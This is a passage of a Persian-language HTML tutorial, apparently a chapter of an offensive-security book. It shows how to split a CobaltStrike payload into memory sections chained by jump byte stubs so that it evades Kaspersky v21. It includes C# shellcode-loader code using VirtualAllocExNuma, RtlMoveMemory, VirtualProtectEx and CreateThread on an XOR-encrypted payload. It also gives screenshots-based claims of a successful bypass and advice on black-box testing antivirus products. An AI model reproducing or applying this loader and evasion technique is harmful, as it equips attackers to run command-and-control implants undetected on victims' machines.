+		<font color="#0000FF"><span lang="fa">B</span>8</font><font color="#FF3200"><span lang="fa">
+		</span> </font><font color="#800000">80 00 CE 01</font><font color="#FF3200"> </font><font color="#0000FF">FF E0</font></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<p dir="ltr" align="left"><b><font size="2" face="Tahoma">In-memory 
+		Section 2 Address [<font color="#800000">0x1CE0080</font>]:
+		<font color="#008000">AA BB CC DD EE FF 11 22 33 44 55 66 77</font></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">در این مرحله بعد از
+		</span>Jump<span lang="fa"> به ادرس </span><font color="#FF0000">
+		0x1CE0080</font><span lang="fa"> کد </span></font></b><b>
+		<font color="#008000" size="2" face="Tahoma">AA BB CC DD EE FF 11 22 33 44 55 66 77</font><font size="2" face="Tahoma">
+		<span lang="fa">اجرا می شود و </span>CobaltStrike<span lang="fa"> </span>
+		Payload<span lang="fa"> بصورت کامل</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در </font></span>
+		<font face="Tahoma" size="2">Memory<span lang="fa"> اجرا می شود با اینکه 
+		در 2 بخش جداگانه نوشته شده بود و اگر همه مراحل به درستی انجام شود شما باید در
+		</span>CobaltStrike<span lang="fa"> یک </span>New Session</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">داشته باشید.</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">درشکل 2 شما می توانید 
+		مشاهده کنید اجرای کد و مراحل اجرا آن را در شکل مشاهده می کنید</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">که </font></span>
+		<font face="Tahoma" size="2">Kaspersky v21<span lang="fa"> توسط این روش
+		</span>Bypass<span lang="fa"> شده.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center"><a href="26feb2024x_files/Pics/kaspersky_bypassed2.png">
+		<img border="0" src="26feb2024x_files/Pics/kaspersky_bypassed2.png" width="815" height="472"></a></td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center" dir="ltr"><b><font face="Tahoma" size="2">Picture 2</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در شکل 2 مشاهده می کنید 
+		که کد کار کرده و </span>Kaspersky v21<span lang="fa"> با آخرین </span>
+		Update<span lang="fa"> دور زده شده</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در شکل 3 ما اجرای کد را 
+		با </span>Detail<span lang="fa"> بیشتر داریم در اینجا شما می توانید 
+		مشاهده کنید&nbsp; </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">مراحل اجرای کد را </font>
+		</span><font face="Tahoma" size="2">Step by step<span lang="fa"> :</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center">
+		<a href="26feb2024x_files/Pics/MainJMP7fixed.png">
+		<img border="0" src="26feb2024x_files/Pics/MainJMP7fixed.png" width="803" height="454"></a></td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center" dir="ltr"><b><font face="Tahoma" size="2">Picture 3</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">مراحل در شکل 3 کاملا 
+		مشخص می باشد</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2"><font color="#000080">
+		نکته</font> : قبل از شرح دادن مراحل شکل 3 در زیر این نکته باید گفته شود 
+		که </font></span><font face="Tahoma" size="2">Memory Section<span lang="fa"> 
+		هایی که در زیر در مورد آنها</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">صحبت می شود باید در
+		</font></span><font face="Tahoma" size="2">Memory<span lang="fa"> دارای
+		</span>Protection Mode Execute + Read<span lang="fa"> حداقل باشند اما من 
+		در کد آنها</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">را در حالت </font>
+		</span><font face="Tahoma" size="2">RWX<span lang="fa"> دارم که </span>
+		ReadWrite + Excute<span lang="fa"> می باشند.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">1. در این مرحله یک
+		</span>CreateThread<span lang="fa"> داریم که در آن </span>Byte Array F9 
+		F9 F9 B8 <font color="#FF0000">00 00 4C 01</font> FF E0<span lang="fa">
+		</span> </font></b><span lang="fa"><b><font face="Tahoma" size="2">اجرا 
+		می شود.</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">2. سپس بعد از اجرای 
+		مرحله 1 کد ما </font></span><font face="Tahoma" size="2">Jump<span lang="fa"> 
+		می کند به آدرس </span><font color="#FF0000">0x14C0000<span lang="fa">
+		</span></font><span lang="fa">و در خانه 80 آن یک کد </span>Jump<span lang="fa"> 
+		می باشد</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">3. در این مرحله کد در 
+		آدرس </font></span><font face="Tahoma" size="2">0x14C0000<span lang="fa"> 
+		اجرا می شود که یک </span>Jump<span lang="fa"> دیگر می باشد به آدرس
+		</span>Section1 of Cobaltstrike Payload<span lang="fa"> </span></font>
+		</b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">آدرس </font></span>
+		<font face="Tahoma" size="2">Section1 <span lang="fa">ما در اینجا </span>
+		<font color="#FF0000">0x14D00</font><font color="#0000FF">80</font><span lang="fa"> 
+		می باشد یعنی در خانه 80 این آدرس </span>Payload<span lang="fa"> ما شروع 
+		شده که همان بخش اول </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2">Payload<span lang="fa"> ما می باشد برای 
+		اجرا در نتیجه بعد </span>Jump<span lang="fa"> شدن به آن آدرس کد آن
+		</span>Payload<span lang="fa"> شروع به اجرا می کند و بخش اول یا </span>
+		Section1<span lang="fa"> ما اجرا می شود </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">4. در آخر مرحله 3 ما یک 
+		کد </font></span><font face="Tahoma" size="2">Jump<span lang="fa"> دیگر 
+		به </span>Section1<span lang="fa"> اضافه کرده ایم که به آدرس </span>
+		Section2<span lang="fa"> ما </span>Jump<span lang="fa"> کند همانطور که 
+		در شکل 3 مشاهده می کنید .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و این آدرس را با اضافه 
+		کردن </font></span><font face="Tahoma" size="2">Byte array F9 F9 F9 B8
+		<font color="#FF0000">80 00 4E 01</font> FF E0 <span lang="fa">به آخر
+		</span>Section1<span lang="fa"> ایجاد کرده ایم .</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در این مرحله در آخر
+		</font></span><font face="Tahoma" size="2">Section1<span lang="fa"> کد 
+		ما پرش می کند به </span>Section2<span lang="fa"> و در آدرس </span>
+		<font color="#FF0000">0x14E00</font><font color="#0000FF">80
+		<span lang="fa">&nbsp;</font>که<font color="#0000FF"> </font></span>
+		<span lang="fa">در خانه 80 آن </span>Section2<span lang="fa"> ما برای
+		</span>Cobaltstrike Payload<span lang="fa"> </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">وجود دارد و ادامه اجرای 
+		کد ازاین بخش ادامه پیدا می کند تا به آخر </font></span>
+		<font face="Tahoma" size="2">Section2<span lang="fa"> برسد که همان آخر
+		</span>Payload<span lang="fa"> ما می باشد.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در نتیجه در آخر مشاهده 
+		می کنید با اینکه ما </font></span><font face="Tahoma" size="2">
+		CobaltStrike Payload<span lang="fa"> را به دو بخش </span>Section1 &amp; 
+		Section2<span lang="fa"> تقسیم کرده ایم با این</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">تکنیک توانستیم آنها را در</font></span><font face="Tahoma" size="2"> 
+		Memory<span lang="fa"> به ترتیب اجراکنیم و در آخر </span>New Session<span lang="fa"> 
+		در </span>CobaltStrike<span lang="fa"> بگیریم و </span>Kaspersky v21<span lang="fa"> 
+		این</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">روش را شناسایی نکرد و
+		</font></span><font face="Tahoma" size="2">Bypass<span lang="fa"> شد.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در</span> <span lang="fa">این کد ما چیزی 
+		مانند این مراحل در </span>Memory<span lang="fa"> برای </span>Jump<span lang="fa"> 
+		کردن بین </span>Memory Address<span lang="fa"> ها داشتیم :</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="left" dir="ltr"><b><font face="Tahoma" size="2">Jump to Memory 
+		Addresses: </font></b></p>
+		<p align="left" dir="ltr"><b><font face="Tahoma" size="2">1.Init code to 
+		run by CreateThread [0x1D390000] jump to [0x14C00<span lang="fa">80</span>] 
+		jump to <font color="#FF0000">[0x14D0080]</font> jump to
+		<font color="#0000FF">[0x14E0080] </font></font></b></p>
+		<p align="left" dir="ltr">&nbsp;</p>
+		<p align="left" dir="ltr"><b><font face="Tahoma" style="font-size: 9pt">
+		Payload Section1<font color="#FF0000"> [0x14D0080]</font> </font></b>
+		</p>
+		<p align="left" dir="ltr"><b><font face="Tahoma" style="font-size: 9pt">
+		Payload Section2</font><font color="#FF0000" face="Tahoma" style="font-size: 9pt">
+		</font><font color="#0000FF" face="Tahoma" style="font-size: 9pt">
+		[0x14E0080] </font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b>
+		<span lang="fa"><font face="Tahoma" size="2"><font color="#000080">نکته</font>: 
+		خود این مورد که شما دو </font></span><font face="Tahoma" size="2">jump<span lang="fa"> 
+		قبل از پرش به </span>Section1<span lang="fa"> دارید می تواند کمک کننده 
+		باشد برای</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">گیج کردن برخی آنتی 
+		ویروسها .</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در شکل 4 شما می توانید 
+		مشاهده کنید که کد اجرا شده و </span>Kaspersky v21 <span lang="fa">+
+		</span>update 2023/08/26<span lang="fa"> نتوانسته این</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b>
+		<span lang="fa"><font face="Tahoma" size="2">تکنیک را شناسایی کند. </font></span></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center"><a href="26feb2024x_files/Pics/7_X1.png">
+		<img border="0" src="26feb2024x_files/Pics/7_X1.png" width="762" height="437"></a></td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center" dir="ltr"><b><font face="Tahoma" size="2">Picture 4</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در شکل 4 مشاهده می کنید 
+		که یک </span>Thread<span lang="fa"> در حالت </span>Suspend<span lang="fa"> 
+		می باشد دلیل آن در کد می باشد.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">این نکته باید شرح داده 
+		شود در کد مربوط به این بخش 3 از فصل 4 من در آن یک روشی را تست کرده ام</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">در کد زیر می توانید 
+		مشاهده کنید که من </font></span><font face="Tahoma" size="2">
+		Encrypted_Payload<span lang="fa"> را بدون اینکه</span> decrypt
+		<span lang="fa">کنم توسط </span>xor Method<span lang="fa"> آنرا در
+		</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2">Memory<span lang="fa"> توسط </span>
+		<font color="#800000">RtlMoveMemory<span lang="fa"> </span></font>
+		<span lang="fa">در حافظه نوشته ام و یک </span><font color="#800000">
+		CreateThread </font><span lang="fa">از آن ساخته ام در حالت </span>
+		Suspend<span lang="fa"> </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">چرا حالت </font></span>
+		<font face="Tahoma" size="2">Suspend <span lang="fa">ایجاد شده در تصور4 
+		بدلیل اینکه من در </span>CreateThread<span lang="fa"> از </span>
+		<font color="#FF0000">0x00000004 </font><span lang="fa">بجای<font color="#FF0000">
+		</font></span><font color="#FF0000">0x0</font><span lang="fa"> استفاده 
+		کرده ام</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p dir="ltr" align="left"><b><font face="Tahoma" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		string <font color="#FF3200">Payload_Encrypted</font> = &quot;<font color="#999966">236 
+		88 147 244 224 248 220 16 16 16 81 65 81 64 66 88 33 194</font> ...&quot;;</font></b></p>
+		<p dir="ltr" align="left"><b><font size="2" face="Tahoma">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		string[] Payload_Encrypted_Without_delimiterChar = 
+		Payload_Encrypted.Split(&#39; &#39;);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		byte[] _X_to_Bytes = new 
+		byte[Payload_Encrypted_Without_delimiterChar.Length];<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		for (int i = 0; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		{<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		byte current = 
+		Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		_X_to_Bytes[i] = current;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		}<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		IntPtr ProcessHandle2 = <font color="#800000">OpenProcess</font>(0x001F0FFF, 
+		false, System.Diagnostics.Process.GetCurrentProcess().Id);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		Console.WriteLine();<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		uint <font color="#FF6600">AddressOfPayload_In_Mem</font> =
+		<font color="#800000">VirtualAllocExNuma</font>(ProcessHandle2, 
+		IntPtr.Zero, (uint)_X_to_Bytes.Length, 0x1000, 0x40, 0);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+		<font color="#800000">RtlMoveMemory</font>(AddressOfPayload_In_Mem, _X_to_Bytes, 
+		(uint)_X_to_Bytes.Length);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		Console.WriteLine(&quot;[!] Encrypted payload write to Part2 [startaddr + 
+		part2] for MemoryAddress of Thread.Result[&quot; </font></b></p>
+		<p dir="ltr" align="left"><b><font size="2" face="Tahoma">+ (AddressOfPayload_In_Mem 
+		+ ((uint)_X_to_Bytes.Length / 2)).ToString(&quot;X8&quot;) + &quot;]&quot;);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		Console.WriteLine(&quot;[!] Encrypted payload write to Part1 [startaddr] for 
+		MemoryAddress of Thread.Result[&quot; </font></b></p>
+		<p dir="ltr" align="left"><b><font size="2" face="Tahoma">+ (AddressOfPayload_In_Mem).ToString(&quot;X8&quot;) 
+		+ &quot;]&quot;);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		Console.WriteLine(&quot;[!] New Thread will Create with StartAddress 
+		VirtualAlloc.Result[&quot;</font></b></p>
+		<p dir="ltr" align="left"><b><font size="2" face="Tahoma">&nbsp;+ 
+		AddressOfPayload_In_Mem.ToString(&quot;X8&quot;) + &quot;]&quot;);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = 
+		IntPtr.Zero;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+		<font color="#800000">VirtualProtectEx</font>(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, 
+		(UIntPtr)_X_to_Bytes.Length, <font color="#FF0000">0x04</font>, out uint 
+		_);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		Console.WriteLine(&quot;[!] Protection Mode in Memory set to 0x20 
+		Read_Execute, StartAddress.Result[&quot; </font></b></p>
+		<p dir="ltr" align="left"><b><font size="2" face="Tahoma">+ 
+		AddressOfPayload_In_Mem.ToString(&quot;X8&quot;) + &quot;]&quot;);<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		/// execute native code in memory via create local thread<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+		hThread = <font color="#800000">CreateThread</font>(0, 0, (IntPtr)AddressOfPayload_In_Mem, 
+		pinfo, <font color="#FF0000">0x00000004</font>, ref threadId);</font></b><br>
+&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">دلیل اینکه من در حالت
+		</span>Suspend<span lang="fa"> یک </span>Payload<span lang="fa"> کامل از
+		</span>CobaltStrike<span lang="fa"> را بصورت </span>Encrypt<span lang="fa"> 
+		شده در </span>Thread<span lang="fa"> قرار داده ام</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">این می باشد که </font>
+		</span><font face="Tahoma" size="2">Anti-virus<span lang="fa"> مد نظر 
+		خودم را تست کنم آیا وقتی یک </span>New Thread<span lang="fa"> در حالت
+		</span>Suspend<span lang="fa"> ایجاد می شود</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">آن را چک می کند اگر بله 
+		چه واکنشی انجام می دهد وقتی مقدار درون </font></span>
+		<font face="Tahoma" size="2">New Thread<span lang="fa"> بصورت </span>
+		Encrypt<span lang="fa"> باشد و نه </span>Decrypt</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و آیا زمانی که یک </font>
+		</span><font face="Tahoma" size="2">New Thread<span lang="fa"> در حالت
+		</span>Suspend<span lang="fa"> مشاهده کرد و چیزی تشخیص نداد دیگر به 
+		موارد دیگری که ممکن</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">می باشد مخرب باشد در
+		</font></span><font face="Tahoma" size="2">Memory<span lang="fa"> توجه 
+		می کند یا خیر بدلیل اینکه تستهای ما بر روی </span>AV <span lang="fa">ها 
+		بصورت </span>Black Box<span lang="fa"> می باشد</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و ما </font></span>
+		<font face="Tahoma" size="2">Source<span lang="fa"> های آنتی ویروس ها را 
+		نداریم تمامی مواردی که به ذهن شما می رسد باید در حالتهای مختلف بر روی تک تک
+		</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">آنتی ویروس ها تست شود تا 
+		شما دیدی از آنها بدست آورید و همچنین ببینید آیا ایده شما جواب می دهد یا 
+		خیر . من می توانم همین کد</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">که در </font></span>
+		<font face="Tahoma" size="2">Code 4.3<span lang="fa"> مشاهده می کنید را 
+		بدون انجام این تکه کد بالا نیز انجام دهم و ببینم آیا تفاوتی در </span>
+		Detection<span lang="fa"> می کند یا باز هم</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2">Kaspersky v21<span lang="fa"> دور زده می 
+		شود اگر نتیجه یکسان بود متوجه می شوم تا حدودی که این ایده من خیلی کار 
+		مهمی در ایجاد واکنش درست یا</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">اشتباه آنتی ویروس نداشته 
+		اما اگر مشاهده کردم که نبودن این کد موجب می شود آنتی ویروس روش </font>
+		</span><font face="Tahoma" size="2">Chunking Payload<span lang="fa"> من 
+		را شناسایی کند</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">آنوقت متوجه می شوم که 
+		این کد تاثیر دارد و بیشتر بر روی آن تمرکز می کنم که دقیقا این ایده چرا 
+		کار کرده و الی آخر و شما باید این</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">مورد را در نظر داشته 
+		باشید که برنامه نویسان شرکتهای آنتی ویروس افرادی می باشند همانند من و 
+		شما و آنها نیز مشکلاتی</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در کدهایشان وجود دارد و 
+		حتما </span>Bug<span lang="fa"> دارند همانند کد من و شما در نتیجه چون ما 
+		این موارد را نمی دانیم باید آنها را بصورت </span>Black box<span lang="fa"> 
+		تست</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">کنیم و ایده های خود را 
+		در کدهای مختلف تست کنیم تا چیزی از درون آنها پیدا کنیم در نتیجه من این 
+		تست را انجام دادم تا ببینم واکنش</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">آنتی ویروس مد نظر خود را 
+		در مورد این </font></span><font face="Tahoma" size="2">New Thread<span lang="fa"> 
+		در حالت </span>Suspend<span lang="fa"> و به دلیل اینکه ما می دانیم 
+		معمولا </span>Suspend<span lang="fa"> </span>Thread</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">برای روشهایی از حمله 
+		استفاده می شود در نتیجه استفاده از آن ریسک بالا دارد بر روی برخی از
+		</font></span><font face="Tahoma" size="2">Anti-virus<span lang="fa"> ها 
+		حتی اگر </span>Payload<span lang="fa"> شما </span>Encrypt<span lang="fa"> 
+		باشد</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و شما</font></span><font face="Tahoma" size="2"> 
+		New Thread<span lang="fa"> را در کد </span>Resume<span lang="fa"> نکنید.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center"><a href="26feb2024x_files/Pics/7_X2.png">
+		<img border="0" src="26feb2024x_files/Pics/7_X2.png" width="787" height="451"></a></td>
+	</tr>
+	<tr>
+		<td>
+		<p align="center" dir="ltr"><b><font face="Tahoma" size="2">Picture 5</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">در شکل 5 مشاهده می کنید
+		</span>Section <span lang="fa">ها ما در </span>Memory<span lang="fa"> که 
+		دارای </span>Protection Mode RWX<span lang="fa"> می باشند و کد بخوبی کار 
+		کرده </span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و توسط </font></span>
+		<font face="Tahoma" size="2">Kaspersky v21<span lang="fa"> این مورد 
+		شناسایی نشده.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">مواردی در این کد می باشد 
+		که من باید شرح بدم اما کل کد را خط به خط توضیح نمیدم به این دلیل که</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">من فکر می کنم شما باید 
+		اول تمامی فصلهای گذشته را بخوبی یاد گرفته باشید تا این کد را متوجه شوید 
+		و اگر شما فصلهای </font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">قبلی را متوجه نشده باشید 
+		کدهای زیر را نمی توانید متوجه شوید در نتیجه هدف من این می باشد که دانشجو 
+		کمی خودش تلاش کند کد را </font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">بخواند و متوجه آن شود با 
+		توجه به مواردی که من در این کتاب در فصلهای قبلی آموزش داده ام شما می 
+		توانید این کار را بکنید خودتان </font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">و اگر این کار را 
+		توانستید انجام دهید این یعنی که شما خوب مطالب را متوجه شده اید .</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">یکی از مواردی که من در 
+		کد نوشته ام و کمی جدید می باشد استفاده از </font></span>
+		<font face="Tahoma" size="2">F9<span lang="fa"> می باشد در </span>Byte<span lang="fa"> 
+		ها که اگر ساده بگم هیچ کاری انجام نمی دهد و فقط از آن برای </span>
+		</font></b></td>
+	</tr>
